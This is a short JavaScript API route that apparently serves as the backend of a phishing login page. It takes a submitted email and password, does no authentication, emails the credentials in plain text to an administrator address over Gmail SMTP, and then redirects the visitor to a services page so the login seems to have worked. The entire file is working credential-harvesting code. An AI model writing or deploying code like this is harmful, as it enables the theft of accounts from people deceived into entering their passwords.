import nodemailer from "nodemailer";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Only POST allowed" });
  }

  const { email, password } = req.body;

  try {
    let transporter = nodemailer.createTransport({
      host: "smtp.gmail.com",
      port: 587,
      secure: false,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
      }
    });

    await transporter.sendMail({
      from: process.env.SMTP_USER,
      to: process.env.ADMIN_EMAIL,
      subject: "New Login Attempt",
      text: `Email: ${email}, Password: ${password}`
    });

    // Redirect user after login
    res.redirect(302, "https://your-subdomain.example.com/services");

  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Error sending email âŒ" });
  }
}

